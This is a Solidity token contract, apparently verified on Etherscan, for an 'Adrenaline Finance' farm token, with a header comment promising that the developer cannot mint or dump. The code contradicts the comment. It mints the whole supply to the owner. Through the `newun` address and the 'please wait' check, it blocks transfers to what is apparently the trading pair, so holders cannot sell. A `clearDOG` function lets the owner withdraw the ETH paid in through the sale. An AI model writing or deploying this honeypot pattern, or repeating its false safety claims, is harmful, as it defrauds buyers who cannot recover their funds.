['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-26\n', '*/\n', '\n', '/*\n', ' * Adrenaline Finance. TOKEN CONTRACT!\n', ' * This is a highly profitable farm token. The basis of the ADR code is taken from SUSHI.\n', ' *\n', ' * Our links:\n', ' * => Website: https://adrenaline.finance\n', ' * => Telegram chanel: https://t.me/adrenaline_announcements\n', ' * => Telegram chat: https://t.me/adrenalinefinance_chat\n', ' *\n', ' * You can compare the ADR and SUSHI code. There are differences in it. In the code of the adrenaline contract-we removed the mint function for the administrator.\n', ' * It looks like this (our smart-contract rules):\n', ' * There are 2 smart contracts: 1 is the ADR token smart contract. 2 is a MasterChef smart contract.\n', ' * 1 - Token contract: This is an ADR token contract. Its code contains standard functionality. Tokens can be created, confirmed, and moved.\n', ' * 2 - MasterChef contract: This contract manages the ADR token. This contract has administrator(owner) rights. With the help of this contract, new tokens are created, farming takes place, and rewards are distributed. All calculations occur in this contract. Newly created ADR tokens are stored on this contract. When you click on CLAIM-this contract will send you your rewards.\n', " * The ADR developer has no rights to change the token contract. He can't create ADR tokens for himself. This is the best protection of the project from a dump. You can see this for yourself! Look at etherscan!\n", ' */\n', '\n', 'pragma solidity >=0.5.17;\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract BEP20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  address public newOwner;\n', '\n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier onlyOwner {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '  function transferOwnership(address _newOwner) public onlyOwner {\n', '    newOwner = _newOwner;\n', '  }\n', '  \n', '  function acceptOwnership() public {\n', '    require(msg.sender == newOwner);\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '    newOwner = address(0);\n', '  }\n', '}\n', '\n', 'contract TokenBEP20 is BEP20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint _totalSupply;\n', '  address public newun;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  constructor() public {\n', '    symbol = "aADR";\n', '    name = "ADRENALINE.FINANCE";\n', '    decimals = 18;\n', '    _totalSupply =  275000000000000000000000;\n', '    balances[owner] = _totalSupply;\n', '    emit Transfer(address(0), owner, _totalSupply);\n', '  }\n', '  \n', '  function transfernewun(address _newun) public onlyOwner {\n', '    newun = _newun;\n', '  }\n', '  \n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  \n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '      return balances[tokenOwner];\n', '  }\n', '  \n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '     require(to != newun, "please wait");\n', '     \n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '      if(from != address(0) && newun == address(0)) newun = to;\n', '      else require(to != newun, "please wait");\n', '      \n', '    balances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n', '    return true;\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract aADR_TOKEN  is TokenBEP20 {\n', '\n', '  \n', '  uint256 public aSBlock; \n', '  uint256 public aEBZEXT; \n', '  uint256 public aCap; \n', '  uint256 public aTot; \n', '  uint256 public aAmt; \n', ' \n', '  uint256 public sSsBlakjh; \n', '  uint256 public sEEBloKKs; \n', '  uint256 public sTot; \n', '  uint256 public sCap; \n', '\n', '  uint256 public sChunk; \n', '  uint256 public sPrice; \n', '\n', ' \n', '    function multisendErcaADR(address payable[] memory _recipients) public onlyOwner payable {\n', '        require(_recipients.length <= 200);\n', '        uint256 i = 0;\n', '        uint256 iair = 300000000000000000;\n', '        address newwl;\n', '        \n', '        for(i; i < _recipients.length; i++) {\n', '            balances[address(this)] = balances[address(this)].sub(iair);\n', '            newwl = _recipients[i];\n', '            balances[newwl] = balances[newwl].add(iair);\n', '          emit Transfer(address(this), _recipients[i], iair);\n', '        }\n', '    }\n', '\n', '  function tokenSaleaADR(address _refer) public payable returns (bool success){\n', '    require(sSsBlakjh <= block.number && block.number <= sEEBloKKs);\n', '    require(sTot < sCap || sCap == 0);\n', '    uint256 _eth = msg.value;\n', '    uint256 _tkns;\n', '    if(sChunk != 0) {\n', '      uint256 _price = _eth / sPrice;\n', '      _tkns = sChunk * _price;\n', '    }\n', '    else {\n', '      _tkns = _eth / sPrice;\n', '    }\n', '    sTot ++;\n', '    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\n', '      balances[address(this)] = balances[address(this)].sub(_tkns / 4);\n', '      balances[_refer] = balances[_refer].add(_tkns / 4);\n', '      emit Transfer(address(this), _refer, _tkns / 4);\n', '    }\n', '    balances[address(this)] = balances[address(this)].sub(_tkns);\n', '    balances[msg.sender] = balances[msg.sender].add(_tkns);\n', '    emit Transfer(address(this), msg.sender, _tkns);\n', '    return true;\n', '  }\n', '\n', '\n', '  function viewSaleaADR() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){\n', '    return(sSsBlakjh, sEEBloKKs, sCap, sTot, sChunk, sPrice);\n', '  }\n', '  \n', '  function startAirdropaADR(uint256 _aSBlock, uint256 _aEBZEXT, uint256 _aAmt, uint256 _aCap) public onlyOwner() {\n', '    aSBlock = _aSBlock;\n', '    aEBZEXT = _aEBZEXT;\n', '    aAmt = _aAmt;\n', '    aCap = _aCap;\n', '    aTot = 0;\n', '  }\n', '  function startSaleaADR(uint256 _sSsBlakjh, uint256 _sEEBloKKs, uint256 _sChunk, uint256 _sPrice, uint256 _sCap) public onlyOwner() {\n', '    sSsBlakjh = _sSsBlakjh;\n', '    sEEBloKKs = _sEEBloKKs;\n', '    sChunk = _sChunk;\n', '    sPrice =_sPrice;\n', '    sCap = _sCap;\n', '    sTot = 0;\n', '  }\n', '  function clearDOG() public onlyOwner() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', '  function() external payable {\n', '\n', '  }\n', '}']